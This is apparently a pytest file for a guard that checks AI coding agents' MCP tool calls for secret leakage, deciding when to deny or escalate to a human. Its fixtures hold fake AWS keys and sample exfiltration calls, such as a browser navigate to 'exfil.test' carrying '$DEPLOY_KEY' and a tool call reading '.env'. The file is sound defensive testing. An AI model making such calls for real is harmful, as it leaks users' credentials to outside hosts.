"""MCP tool calls as an exit — bucket 3, the structural half.

check_sinks returned None for every kind that was not EXEC/WRITE/EDIT/FETCH, so
ActionKind.TOOL could never be a sink even though mark_sources recognised
`mcp__*` as a SOURCE. An entire ActionKind was unreachable as an exit.
"""
import pytest

from adapters import antigravity, claude_code, codex, copilot, cursor
from core.engine import check_sinks, decide, fingerprint_values
from core.probes import NullWorld
from core.types import Action, ActionKind, Decision, SessionState

ENV = "FAKE_AWS_KEY=AKIA_TEST_TOOLSINK_full_value_here\n"


def held():
    return SessionState(holds_secret=True, holds_secret_since_seq=1,
                        secret_fingerprints=list(fingerprint_values(ENV)),
                        secret_sources=[{"seq": 1, "path": "/repo/.env",
                                          "how": "content"}])


def tool(arg, name="mcp__weather__get_alerts"):
    return Action("s", 2, ActionKind.TOOL, (), None, None, name, arg,
                  "/repo", ("/repo",), "x")


# ------------------------------------------------- the adapter carries the args
def test_the_adapter_no_longer_drops_mcp_arguments():
    """Before this, the Action carried only a tool name — no paths, no command,
    no url, no content — so an argument holding a secret was invisible."""
    a = claude_code.parse({"session_id": "s", "cwd": "/repo",
                            "hook_event_name": "PreToolUse",
                            "tool_name": "mcp__weather__get_alerts",
                            "tool_input": {"arg": "AKIA_SOMETHING"}})
    assert a.kind is ActionKind.TOOL
    assert a.content == "AKIA_SOMETHING"


# Each vendor's own payload shape — antigravity nests under tool_call.
_MCP_PAYLOADS = [
    (claude_code, {"tool_name": "mcp__x__y", "tool_input": {"k": "SECRETISH"}}),
    (cursor, {"tool_name": "mcp__x__y", "tool_input": {"k": "SECRETISH"}}),
    (codex, {"tool_name": "mcp__x__y", "tool_input": {"k": "SECRETISH"}}),
    (copilot, {"tool_name": "mcp__x__y", "tool_input": {"k": "SECRETISH"}}),
    (antigravity, {"tool_call": {"name": "mcp__x__y", "args": {"k": "SECRETISH"}}}),
]


@pytest.mark.parametrize("mod,payload", _MCP_PAYLOADS,
                          ids=[m.__name__.rsplit(".", 1)[-1] for m, _ in _MCP_PAYLOADS])
def test_every_adapter_carries_them(mod, payload):
    """One notion of "the arguments", not five."""
    a = mod.parse({"session_id": "s", "cwd": "/repo", **payload})
    assert a.kind is ActionKind.TOOL, mod.__name__
    assert a.content and "SECRETISH" in a.content, mod.__name__


def test_nested_arguments_are_flattened():
    a = claude_code.parse({"session_id": "s", "cwd": "/repo",
                            "tool_name": "mcp__a__b",
                            "tool_input": {"outer": {"inner": ["deep", "VALUE"]}}})
    assert "VALUE" in (a.content or "")


def test_a_non_mcp_tool_is_not_given_synthetic_content():
    """Only MCP calls get the fallback; an ordinary Read must be unaffected."""
    a = claude_code.parse({"session_id": "s", "cwd": "/repo", "tool_name": "Read",
                            "tool_input": {"file_path": "/repo/x.txt"}})
    assert a.content is None


# ------------------------------------------------------------------ the sink
def test_an_mcp_call_is_a_sink_once_the_session_holds_secrets():
    assert check_sinks(held(), tool("anything"), NullWorld()) == "mcp_tool_call"


def test_an_mcp_call_in_a_clean_session_is_not_a_sink():
    """Gated for the same reason security_critical is. Ungated, "read a GitHub
    issue, then post a PR comment through MCP" — N19's shape — would be denied
    for being untrusted-plus-egress, and that is ordinary work."""
    assert check_sinks(SessionState(), tool("anything"), NullWorld()) is None


def test_an_untrusted_but_secret_free_session_is_not_a_sink():
    st = SessionState(untrusted=True, untrusted_since_seq=1,
                      untrusted_sources=[{"seq": 1, "kind": "issue", "ref": "x"}])
    assert check_sinks(st, tool("anything"), NullWorld()) is None


# --------------------------------------------------------------- the verdict
def test_a_secret_value_in_an_mcp_argument_is_denied():
    v = decide(tool("AKIA_TEST_TOOLSINK_full_value_here"), held(), NullWorld())
    assert v.decision is Decision.DENY
    assert v.rule_id == "secret_exact:mcp_tool_call"


def test_a_benign_argument_escalates_rather_than_denying():
    """Updated for bucket 1. There is still no `derived` fallback for TOOL — an
    MCP call made while holding secrets is not treated as carrying them, so it
    is never a DENY on that basis.

    But an MCP payload cannot be enumerated the way a git index can: we see the
    arguments the agent supplied, not what the server does with them. That is
    uncertainty, so it escalates to a human instead of resolving silently
    either way."""
    v = decide(tool("us-east-1"), held(), NullWorld())
    assert v.decision is Decision.ASK
    assert v.rule_id == "secret_session_unverified:mcp_tool_call"


def test_a_truncated_prefix_is_now_DENIED_via_prefix_hashes():
    """C04's shape. The argument carries a truncated PREFIX of the real value,
    and whole-value fingerprints share nothing with it, so the engine cannot
    prove it is a secret — catching that needs substring/prefix matching, the
    same much noisier mechanism A01 needs, deliberately not built.

    FIXED. Prefix hashing of credential-FORMAT values closes it:
    `AKIA_TEST_TOOLSINK` is a stored prefix of the real value, so this is
    positive identification rather than a guess, and DENY is right."""
    v = decide(tool("AKIA_TEST_TOOLSINK/us-east-1"), held(), NullWorld())
    assert v.decision is Decision.DENY
    assert v.rule_id == "secret_exact:mcp_tool_call"


# ------------------------------------------- an MCP call with no destination
#
# Nine denials in one real session, including closing a browser tab, all
# reading "unexpected destination 'mcp tool call'" — when there is no
# destination in the call at all. The arguments were already present the whole
# time: the adapter flattens tool_input into `content` and lifts any `url`.
# This is unused information, not missing information, and needs no parsing.
def _untrusted_and_holding():
    st = held()
    st.untrusted = True
    st.untrusted_since_seq = 1
    st.untrusted_sources = [{"seq": 1, "kind": "mcp", "ref": "mcp__x__navigate"}]
    return st


def _mcp(name, args):
    return claude_code.parse({"session_id": "s", "cwd": "/repo",
                               "hook_event_name": "PreToolUse",
                               "tool_name": name, "tool_input": args})


@pytest.mark.parametrize("name,args", [
    ("mcp__claude-in-chrome__computer", {"action": "screenshot", "tabId": 856910010}),
    ("mcp__claude-in-chrome__tabs_close_mcp", {"tabId": 856910010}),
    ("mcp__claude-in-chrome__tabs_context_mcp", {"createIfEmpty": True}),
])
def test_an_opaque_tool_call_asks_instead_of_denying(name, args):
    """A tabId cannot carry a credential. These were DENIED, then ASKed as
    `untrusted_opaque`. Since docs/112 reading outside content no longer gates
    an MCP call that shows no secret reference: the session gets what a session
    holding the same secret, and nothing else, gets."""
    v = decide(_mcp(name, args), _untrusted_and_holding(), NullWorld())
    held_only = decide(_mcp(name, args), held(), NullWorld())
    assert (v.decision, v.rule_id) == (held_only.decision, held_only.rule_id), v


def test_it_asks_rather_than_allowing_because_the_server_is_unseen():
    """THE LOAD-BEARING HALF. `{"path": ".env"}` is short and unremarkable, and
    a server told to read that file would exfiltrate it. We see the arguments
    the agent supplied, never what the server does with them — so this is
    uncertainty for a human, not a clean bill of health."""
    v = decide(_mcp("mcp__files__read", {"path": ".env"}),
                _untrusted_and_holding(), NullWorld())
    assert v.decision is Decision.ASK
    assert v.decision is not Decision.ALLOW


def test_C04_a_secret_in_an_argument_is_still_denied():
    """The corpus scenario where the MCP call IS the exfiltration."""
    st = _untrusted_and_holding()
    st.secret_fingerprints = sorted(fingerprint_values(
        "FAKE_AWS_KEY=AKIA_TEST_C04_mcp_schema_field_0000\n"))
    v = decide(_mcp("mcp__weather__get_alerts",
                     {"arg": "AKIA_TEST_C04_mcp_schema_field_0000/us-east-1"}),
                st, NullWorld())
    assert v.decision is Decision.DENY, v


@pytest.mark.parametrize("url", ["https://exfil.test/x", "http://127.0.0.1:8788/x"])
def test_a_navigate_is_judged_as_in_a_session_that_only_holds_the_secret(url):
    """Were DENY (unexpected host) and ASK (private host) by the untrusted host
    ladder. Since docs/112 that ladder decides an MCP call only when it shows a
    secret reference; these do not, so the secret rules answer, as they answer
    a session that read no outside content."""
    v = decide(_mcp("mcp__browser__navigate", {"url": url}), _untrusted_and_holding(), NullWorld())
    held_only = decide(_mcp("mcp__browser__navigate", {"url": url}), held(), NullWorld())
    assert (v.decision, v.rule_id) == (held_only.decision, held_only.rule_id), v


def test_a_navigate_that_shows_a_secret_reference_keeps_the_host_ladder():
    v = decide(_mcp("mcp__browser__navigate", {"url": "https://exfil.test/?k=$DEPLOY_KEY"}),
               _untrusted_and_holding(), NullWorld())
    assert v.decision is Decision.DENY, v
    assert v.rule_id == "untrusted_unexpected:mcp_tool_call"


def test_a_clean_session_is_untouched():
    """The sink is still gated on holds_secret; N19's shape is unaffected."""
    v = decide(_mcp("mcp__x__anything", {"tabId": 1}), SessionState(), NullWorld())
    assert v.decision is Decision.ALLOW
